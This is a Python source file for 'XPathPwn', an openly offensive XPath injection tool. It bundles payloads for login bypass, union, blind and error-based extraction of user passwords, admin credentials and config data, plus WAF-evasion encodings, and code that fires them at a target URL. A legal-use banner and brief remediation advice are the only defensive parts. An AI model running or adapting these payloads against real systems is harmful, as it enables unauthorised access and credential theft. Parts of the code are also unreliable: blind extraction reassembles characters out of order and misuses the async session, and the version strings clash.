#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XPathPwn - Advanced XPath Injection Exploitation Tool
Author: Skyfox (https://github.com/skyfox-arch)
Version: 2.0.2024
License: MIT
"""

import argparse
import asyncio
import aiohttp
import string
import time
import json
import sys
import os
from datetime import datetime
from urllib.parse import quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Back, Style
import re
from typing import List, Dict, Optional, Tuple

# Initialize colorama for cross-platform colored output
init(autoreset=True)

class Colors:
    """Terminal color constants"""
    SUCCESS = Fore.GREEN
    ERROR = Fore.RED
    WARNING = Fore.YELLOW
    INFO = Fore.CYAN
    BOLD = Style.BRIGHT
    RESET = Style.RESET_ALL

class XPathPwn:
    """
    Main class for XPath injection detection and exploitation
    """
    
    def __init__(self):
        """Initialize XPathPwn with default settings"""
        self.target_url = None
        self.method = "GET"
        self.vulnerable_param = None
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.cookies = {}
        self.proxy = None
        self.timeout = 10
        self.threads = 10
        self.true_string = None
        self.false_string = None
        self.technique = "auto"
        self.output_file = None
        self.verbose = False
        self.session = None
        self.waf_bypass = False
        self.extracted_data = {}
        self.xml_structure = {}
        
        # Load payload database
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict:
        """
        Load and return the payload database for XPath injection
        
        Returns:
            Dict: Categorized payloads for different injection techniques
        """
        return {
            'detection': [
                "'",                                          # Basic single quote
                '"',                                          # Double quote
                "' or '1'='1",                               # Classic OR injection
                '" or "1"="1',                               # Double quote version
                "' or ''='",                                 # Empty string comparison
                '" or ""="',                                 # Double quote empty
                "' or true()",                               # XPath function
                "' or 1=1]['",                               # With bracket closing
                "'][",                                       # Bracket injection
                "'|//",                                      # Pipe operator
                "' or count(/*)>0 or '",                     # Count root nodes
                "' or string-length(/)>0 or '",              # String length check
                "admin' or substring(name(/*[1]),1,1)>'a"    # Advanced detection
            ],
            
            'auth_bypass': [
                # Username, Password pairs for authentication bypass
                ("' or '1'='1", "' or '1'='1"),
                ("' or ''='", "' or ''='"),
                ("' or true() or '", "anything"),
                ("admin' or '1'='1", "anything"),
                ("' or position()=1 or '", "anything"),
                ("'or contains(name,'admin') or'", "anything"),
                ("admin']%00", "anything"),  # Null byte injection
            ],
            
            'extraction': [
                # Union-based extraction payloads
                "'] | //text() | //*[''='",                  # All text nodes
                "'] | //* | //*[''='",                       # All nodes
                "'] | //user/* | //*[''='",                  # User data
                "'] | //password | //*[''='",                # Passwords
                "'] | //@* | //*[''='",                      # All attributes
                "') or 1=1] | //user/password[('')=('",     # Complex extraction
                "')] | //node()[('')=('",                    # All node values
                "')] | //user/*[1] | a[('",                  # First child of users
                "')] | //user/*[2] | a[('",                  # Second child
                "')] | //user/*[3] | a[('",                  # Third child
                "')] | //password%00",                       # Null byte extraction
            ],
            
            'blind': {
                # Templates for blind injection
                'length': "' or string-length({xpath})={value} or ''='",
                'char': "' or substring({xpath},{position},1)='{char}' or ''='",
                'char_code': "' or string-to-codepoints(substring({xpath},{position},1))={code} or ''='",
                'exists': "' or boolean({xpath}) or ''='",
                'count': "' or count({xpath})={value} or ''='",
            },
            
            'structure': [
                # XML structure enumeration payloads
                "and count(/*) = {value}",                    # Root count
                "and count(/*[1]/*) = {value}",              # First level children
                "and count(/*[1]/*[{pos}]/*) = {value}",     # Specific position
                "and name(/*[1]) = '{value}'",               # Node name check
                "and substring(name(/*[1]/*[{pos}]),1,1) = '{char}'",  # Name char
            ],
            
            'waf_bypass': {
                # WAF bypass techniques
                'encoding': [
                    lambda p: quote(p),                       # URL encode
                    lambda p: quote(quote(p)),                # Double URL encode
                    lambda p: p.replace("'", "%27").replace(" ", "%20"),
                    lambda p: p.replace("'", "&#39;").replace(" ", "&#32;"),
                ],
                'case': [
                    lambda p: p.replace(" or ", " Or "),      # Mixed case
                    lambda p: p.replace(" or ", " oR "),
                    lambda p: p.replace(" or ", " OR "),
                ],
                'space': [
                    lambda p: p.replace(" ", "/**/"),         # Comment substitution
                    lambda p: p.replace(" ", "%09"),          # Tab
                    lambda p: p.replace(" ", "%0A"),          # Newline
                    lambda p: p.replace(" ", "+"),            # Plus sign
                ],
                'comment': [
                    lambda p: p.replace(" or ", "/**/or/**/"),
                    lambda p: p.replace("'", "'--+"),
                ]
            }
        }
    
    def print_banner(self):
        """Print the tool banner with ASCII art"""
        banner = f"""
{Colors.BOLD}{Colors.INFO}
 __  ______      _   _     ____                      
 \ \/ /  _ \ __ _| |_| |__ |  _ \__      ___ __  
  \  /| |_) / _` | __| '_ \| |_) \ \ /\ / / '_ \ 
  /  \|  __/ (_| | |_| | | |  __/ \ V  V /| | | |
 /_/\_\_|   \__,_|\__|_| |_|_|     \_/\_/ |_| |_| v2.0.2025
                                                  
{Colors.RESET}Advanced XPath Injection Exploitation Tool
Developed by: {Colors.INFO}https://github.com/skyfox-arch{Colors.RESET}
{Colors.WARNING}[!] Legal use only. You are responsible for your actions.{Colors.RESET}
"""
        print(banner)
    
    async def scan(self, url: str, params: List[str], method: str = "GET", 
                   data: str = None, headers: Dict = None):
        """
        Main scanning function to detect and exploit XPath injection
        
        Args:
            url: Target URL
            params: List of parameters to test
            method: HTTP method (GET/POST)
            data: POST data string
            headers: Additional HTTP headers
        """
        self.target_url = url
        self.method = method.upper()
        
        if headers:
            self.headers.update(headers)
        
        print(f"\n{Colors.INFO}[*] Starting XPath injection scan...")
        print(f"[*] Target: {url}")
        print(f"[*] Method: {self.method}")
        print(f"[*] Parameters: {', '.join(params)}{Colors.RESET}\n")
        
        # Create aiohttp session
        async with aiohttp.ClientSession() as self.session:
            # Detect injection points
            vulnerable_params = []
            for param in params:
                if await self.detect_injection(param, data):
                    vulnerable_params.append(param)
            
            if not vulnerable_params:
                print(f"{Colors.ERROR}[-] No XPath injection found{Colors.RESET}")
                return
            
            print(f"\n{Colors.SUCCESS}[+] Found {len(vulnerable_params)} vulnerable parameter(s){Colors.RESET}")
            
            # Exploit each vulnerability
            for param in vulnerable_params:
                self.vulnerable_param = param
                print(f"\n{Colors.INFO}[*] Exploiting parameter: {param}{Colors.RESET}")
                
                # Determine exploitation technique
                technique = await self.determine_technique()
                print(f"{Colors.INFO}[*] Using technique: {technique}{Colors.RESET}")
                
                # Extract data based on technique
                if technique == "union":
                    await self.exploit_union()
                elif technique == "blind":
                    await self.exploit_blind()
                elif technique == "error":
                    await self.exploit_error()
                else:
                    print(f"{Colors.WARNING}[!] Unknown technique{Colors.RESET}")
            
            # Generate report
            self.generate_report()
    
    async def detect_injection(self, param: str, data: str = None) -> bool:
        """
        Detect XPath injection in a specific parameter
        
        Args:
            param: Parameter name to test
            data: POST data if applicable
            
        Returns:
            bool: True if vulnerable, False otherwise
        """
        print(f"{Colors.INFO}[*] Testing parameter: {param}{Colors.RESET}")
        
        # Get baseline response
        normal_response = await self.send_request({param: "normalvalue"}, data)
        if not normal_response:
            return False
        
        # Test each detection payload
        for payload in self.payloads['detection']:
            if self.waf_bypass:
                payload = self.apply_waf_bypass(payload)
            
            # Send payload
            test_response = await self.send_request({param: payload}, data)
            if not test_response:
                continue
            
            # Analyze response differences
            if self.analyze_response(normal_response, test_response, payload):
                print(f"{Colors.SUCCESS}  [+] Vulnerable! Payload: {payload}{Colors.RESET}")
                return True
        
        return False
    
    async def send_request(self, params: Dict, data: str = None) -> Optional[str]:
        """
        Send HTTP request with given parameters
        
        Args:
            params: Dictionary of parameters
            data: POST data string
            
        Returns:
            Optional[str]: Response text or None if error
        """
        try:
            if self.method == "GET":
                async with self.session.get(
                    self.target_url,
                    params=params,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxy=self.proxy,
                    timeout=self.timeout,
                    ssl=False
                ) as response:
                    return await response.text()
            
            elif self.method == "POST":
                # Parse POST data
                post_data = {}
                if data:
                    for pair in data.split('&'):
                        if '=' in pair:
                            k, v = pair.split('=', 1)
                            post_data[k] = v
                
                # Update with injection parameters
                post_data.update(params)
                
                async with self.session.post(
                    self.target_url,
                    data=post_data,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxy=self.proxy,
                    timeout=self.timeout,
                    ssl=False
                ) as response:
                    return await response.text()
                    
        except Exception as e:
            if self.verbose:
                print(f"{Colors.ERROR}  [-] Request error: {str(e)}{Colors.RESET}")
            return None
    
    def analyze_response(self, normal: str, test: str, payload: str) -> bool:
        """
        Analyze response differences to detect injection
        
        Args:
            normal: Normal response text
            test: Test response text
            payload: Payload that was sent
            
        Returns:
            bool: True if injection detected
        """
        # Check for XPath error patterns
        error_patterns = [
            r'xpath',
            r'XPath',
            r'XML',
            r'invalid.*expression',
            r'unterminated.*string',
            r'SimpleXMLElement',
            r'DOMXPath',
            r'xmlXPathEval',
            r'javax\.xml\.xpath'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, test, re.IGNORECASE) and not re.search(pattern, normal, re.IGNORECASE):
                return True
        
        # Check for true/false strings
        if self.true_string and self.true_string in test and self.true_string not in normal:
            return True
        
        if self.false_string and self.false_string in normal and self.false_string not in test:
            return True
        
        # Check significant length difference
        if abs(len(normal) - len(test)) > 100:
            return True
        
        # Check for sensitive data exposure
        sensitive_keywords = ['password', 'secret', 'token', 'api', 'key']
        for keyword in sensitive_keywords:
            if keyword in test.lower() and keyword not in normal.lower():
                return True
        
        return False
    
    async def determine_technique(self) -> str:
        """
        Determine the best exploitation technique
        
        Returns:
            str: Technique name (union/blind/error)
        """
        # Test union-based injection
        union_payload = "'] | //text() | //*[''='"
        response = await self.send_request({self.vulnerable_param: union_payload})
        
        if response and len(response) > 1000:  # Assume union works if response is large
            return "union"
        
        # Test blind injection
        blind_test1 = "' or '1'='1"
        blind_test2 = "' or '1'='2"
        
        resp1 = await self.send_request({self.vulnerable_param: blind_test1})
        resp2 = await self.send_request({self.vulnerable_param: blind_test2})
        
        if resp1 and resp2 and len(resp1) != len(resp2):
            return "blind"
        
        # Default to error-based
        return "error"
    
    async def exploit_union(self):
        """Exploit using union-based technique"""
        print(f"\n{Colors.INFO}[*] Extracting data using union-based technique...{Colors.RESET}")
        
        extraction_payloads = [
            ("All text nodes", "'] | //text() | //*[''='"),
            ("All nodes", "'] | //* | //*[''='"),
            ("User passwords", "'] | //user/password | //*[''='"),
            ("All attributes", "'] | //@* | //*[''='"),
            ("Sensitive data", "'] | //*[contains(name(),'password') or contains(name(),'secret')] | //*[''='"),
        ]
        
        for desc, payload in extraction_payloads:
            print(f"\n{Colors.INFO}[*] Trying: {desc}{Colors.RESET}")
            
            response = await self.send_request({self.vulnerable_param: payload})
            if response:
                # Extract data from response
                extracted = self.extract_data_from_response(response)
                if extracted:
                    print(f"{Colors.SUCCESS}[+] Extracted {len(extracted)} items{Colors.RESET}")
                    for item in extracted[:10]:  # Show first 10 items
                        print(f"  {Colors.SUCCESS}└─ {item}{Colors.RESET}")
                    
                    # Save extracted data
                    if desc not in self.extracted_data:
                        self.extracted_data[desc] = []
                    self.extracted_data[desc].extend(extracted)
    
    async def exploit_blind(self):
        """Exploit using blind injection technique"""
        print(f"\n{Colors.INFO}[*] Extracting data using blind injection...{Colors.RESET}")
        
        # Target XPath expressions to extract
        targets = [
            ("First username", "//user[1]/name"),
            ("First password", "//user[1]/password"),
            ("Admin password", "//user[account='admin']/password"),
            ("Database config", "//config/database"),
        ]
        
        for desc, xpath in targets:
            print(f"\n{Colors.INFO}[*] Extracting: {desc}{Colors.RESET}")
            
            # Check if node exists
            exists_payload = self.payloads['blind']['exists'].format(xpath=xpath)
            response = await self.send_request({self.vulnerable_param: exists_payload})
            
            if not self.is_true_response(response):
                print(f"{Colors.WARNING}  [-] Node not found{Colors.RESET}")
                continue
            
            # Get length
            length = await self.get_length_blind(xpath)
            if length == 0:
                continue
            
            print(f"{Colors.INFO}  [*] Length: {length}{Colors.RESET}")
            
            # Extract string
            result = await self.extract_string_blind(xpath, length)
            if result:
                print(f"{Colors.SUCCESS}  [+] {desc}: {result}{Colors.RESET}")
                self.extracted_data[desc] = result
    
    async def get_length_blind(self, xpath: str) -> int:
        """
        Get string length using blind injection
        
        Args:
            xpath: XPath expression to measure
            
        Returns:
            int: Length of the string
        """
        # Binary search for efficiency
        low, high = 0, 100
        
        while low <= high:
            mid = (low + high) // 2
            
            payload = self.payloads['blind']['length'].format(xpath=xpath, value=mid)
            response = await self.send_request({self.vulnerable_param: payload})
            
            if self.is_true_response(response):
                return mid
            
            # Test if greater than mid
            payload_gt = f"' or string-length({xpath})>{mid} or ''='"
            response_gt = await self.send_request({self.vulnerable_param: payload_gt})
            
            if self.is_true_response(response_gt):
                low = mid + 1
            else:
                high = mid - 1
        
        return 0
    
    async def extract_string_blind(self, xpath: str, length: int) -> str:
        """
        Extract string using blind injection
        
        Args:
            xpath: XPath expression to extract
            length: Length of the string
            
        Returns:
            str: Extracted string
        """
        result = ""
        
        # Use thread pool for concurrent extraction
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for pos in range(1, length + 1):
                future = executor.submit(self.extract_char_at_position, xpath, pos)
                futures.append(future)
            
            # Collect results in order
            for i, future in enumerate(as_completed(futures)):
                char = future.result()
                result += char
                
                # Show progress bar
                progress = int((i + 1) / length * 50)
                bar = '█' * progress + '░' * (50 - progress)
                print(f"\r  {Colors.INFO}[{bar}] {i+1}/{length} - {result}{Colors.RESET}", end='')
        
        print()  # New line after progress bar
        return result
    
    def extract_char_at_position(self, xpath: str, position: int) -> str:
        """
        Extract character at specific position (synchronous for thread pool)
        
        Args:
            xpath: XPath expression
            position: Character position
            
        Returns:
            str: Extracted character
        """
        # Test common characters first for efficiency
        common_chars = "etaoinshrdlcumwfgypbvkjxqz0123456789"
        
        for char in common_chars:
            payload = self.payloads['blind']['char'].format(
                xpath=xpath, 
                position=position, 
                char=char
            )
            
            # Synchronous request for thread pool
            response = asyncio.run(self.send_request({self.vulnerable_param: payload}))
            
            if self.is_true_response(response):
                return char
        
        # Test remaining printable characters
        for char in string.printable:
            if char not in common_chars:
                payload = self.payloads['blind']['char'].format(
                    xpath=xpath,
                    position=position,
                    char=char
                )
                
                response = asyncio.run(self.send_request({self.vulnerable_param: payload}))
                
                if self.is_true_response(response):
                    return char
        
        return '?'  # Unknown character
    
    def is_true_response(self, response: str) -> bool:
        """
        Determine if response indicates true condition
        
        Args:
            response: HTTP response text
            
        Returns:
            bool: True if condition is true
        """
        if not response:
            return False
        
        if self.true_string:
            return self.true_string in response
        
        if self.false_string:
            return self.false_string not in response
        
        # Default heuristic
        return len(response) > 500
    
    async def exploit_error(self):
        """Exploit using error-based technique"""
        print(f"\n{Colors.INFO}[*] Attempting error-based extraction...{Colors.RESET}")
        
        error_payloads = [
            # Trigger errors containing data
            "' or substring(//user[1]/password,1,100) div 0 and '",
            "' or //user[1]/password[invalid::test] and '",
            "' and name(/*[1]) div 0 and '",
        ]
        
        for payload in error_payloads:
            response = await self.send_request({self.vulnerable_param: payload})
            if response:
                # Extract data from error messages
                patterns = [
                    r"value '([^']+)'",
                    r"expected ([^,]+),",
                    r": (.+) at position",
                    r"Invalid token '([^']+)'"
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, response)
                    if matches:
                        print(f"{Colors.SUCCESS}[+] Extracted from error: {matches}{Colors.RESET}")
                        self.extracted_data['error_based'] = matches
    
    def extract_data_from_response(self, response: str) -> List[str]:
        """
        Extract potential sensitive data from response
        
        Args:
            response: HTTP response text
            
        Returns:
            List[str]: Extracted data items
        """
        # Remove HTML tags
        clean_text = re.sub(r'<[^>]+>', ' ', response)
        
        # Patterns for sensitive data
        patterns = [
            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # Email
            r'[a-f0-9]{32}',  # MD5 hash
            r'[a-f0-9]{40}',  # SHA1 hash
            r'[a-f0-9]{64}',  # SHA256 hash
            r'password["\s:]+([^"\s,}]+)',  # Password fields
            r'token["\s:]+([^"\s,}]+)',  # Token fields
            r'api[_-]?key["\s:]+([^"\s,}]+)',  # API keys
        ]
        
        extracted = []
        for pattern in patterns:
            matches = re.findall(pattern, clean_text, re.IGNORECASE)
            extracted.extend(matches)
        
        # Extract unique text fragments
        words = clean_text.split()
        unique_words = []
        for word in words:
            if len(word) > 5 and word not in unique_words:
                unique_words.append(word)
        
        extracted.extend(unique_words[:50])  # Limit to prevent spam
        
        return list(set(extracted))  # Remove duplicates
    
    def apply_waf_bypass(self, payload: str) -> str:
        """
        Apply WAF bypass techniques to payload
        
        Args:
            payload: Original payload
            
        Returns:
            str: Obfuscated payload
        """
        import random
        
        # Randomly select encoding technique
        encoding = random.choice(list(self.payloads['waf_bypass']['encoding']))
        payload = encoding(payload)
        
        # Randomly select space substitution
        space = random.choice(list(self.payloads['waf_bypass']['space']))
        payload = space(payload)
        
        return payload
    
    def generate_report(self):
        """Generate and save scan report"""
        report = {
            'scan_info': {
                'target': self.target_url,
                'method': self.method,
                'scan_time': datetime.now().isoformat(),
                'vulnerable_param': self.vulnerable_param,
            },
            'extracted_data': self.extracted_data,
            'recommendations': [
                'Use parameterized XPath queries',
                'Implement input validation with whitelist',
                'Escape special XPath characters',
                'Use least privilege principle for XML data access',
                'Regular security audits and penetration testing'
            ]
        }
        
        # Save JSON report
        if self.output_file:
            with open(self.output_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            print(f"\n{Colors.SUCCESS}[+] Report saved to: {self.output_file}{Colors.RESET}")
        
        # Print summary
        print(f"\n{Colors.BOLD}{'='*60}")
        print(f"{Colors.INFO}SCAN SUMMARY{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"Target: {self.target_url}")
        print(f"Vulnerable Parameter: {self.vulnerable_param}")
        print(f"Total Extracted Items: {sum(len(v) if isinstance(v, list) else 1 for v in self.extracted_data.values())}")
        
        if self.extracted_data:
            print(f"\n{Colors.SUCCESS}Extracted Data:{Colors.RESET}")
            for key, value in self.extracted_data.items():
                if isinstance(value, list):
                    print(f"  {Colors.INFO}{key}: {len(value)} items{Colors.RESET}")
                else:
                    display_value = str(value)[:50] + "..." if len(str(value)) > 50 else str(value)
                    print(f"  {Colors.INFO}{key}: {display_value}{Colors.RESET}")

async def main():
    """Main function - parse arguments and run scan"""
    parser = argparse.ArgumentParser(
        description='XPathPwn - Advanced XPath Injection Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic scan
  python xpathpwn.py -u http://target.com/search -p query
  
  # POST request with data
  python xpathpwn.py -u http://target.com/login -m POST -p username,password -d "user=test&pass=test"
  
  # With custom headers and cookies
  python xpathpwn.py -u http://target.com/api -p filter -H "Authorization: Bearer token" -c "session=abc123"
  
  # Blind injection with true string
  python xpathpwn.py -u http://target.com/check -p id --true-string "Welcome"
  
  # With WAF bypass and proxy
  python xpathpwn.py -u http://target.com/search -p q --waf-bypass --proxy http://127.0.0.1:8080
        """
    )
    
    # Required arguments
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--params', required=True, help='Parameters to test (comma-separated)')
    
    # Optional arguments
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method (default: GET)')
    parser.add_argument('-d', '--data', help='POST data (format: param1=value1&param2=value2)')
    parser.add_argument('-H', '--headers', action='append', help='Custom headers (can be used multiple times)')
    parser.add_argument('-c', '--cookies', help='Cookies (format: name1=value1; name2=value2)')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads for blind injection (default: 10)')
    
    # Detection options
    parser.add_argument('--true-string', help='String that indicates true condition')
    parser.add_argument('--false-string', help='String that indicates false condition')
    parser.add_argument('--technique', choices=['auto', 'union', 'blind', 'error'], default='auto', 
                       help='Injection technique (default: auto)')
    
    # Output options
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    # Advanced options
    parser.add_argument('--waf-bypass', action='store_true', help='Enable WAF bypass techniques')
    parser.add_argument('--no-banner', action='store_true', help='Skip banner')
    
    args = parser.parse_args()
    
    # Create XPathPwn instance
    xpwn = XPathPwn()
    
    # Print banner unless disabled
    if not args.no_banner:
        xpwn.print_banner()
    
    # Configure settings from arguments
    xpwn.method = args.method
    xpwn.timeout = args.timeout
    xpwn.threads = args.threads
    xpwn.true_string = args.true_string
    xpwn.false_string = args.false_string
    xpwn.technique = args.technique
    xpwn.output_file = args.output
    xpwn.verbose = args.verbose
    xpwn.waf_bypass = args.waf_bypass
    
    # Process custom headers
    if args.headers:
        for header in args.headers:
            if ':' in header:
                key, value = header.split(':', 1)
                xpwn.headers[key.strip()] = value.strip()
    
    # Process cookies
    if args.cookies:
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                xpwn.cookies[key.strip()] = value.strip()
    
    # Set proxy
    if args.proxy:
        xpwn.proxy = args.proxy
    
    # Parse parameters
    params = [p.strip() for p in args.params.split(',')]
    
    # Run scan
    try:
        await xpwn.scan(args.url, params, args.method, args.data)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Scan interrupted by user{Colors.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.ERROR}[!] Error: {str(e)}{Colors.RESET}")
        if xpwn.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Enable colors on Windows
    if sys.platform == 'win32':
        os.system('color')
    
    # Run main async function
    asyncio.run(main())
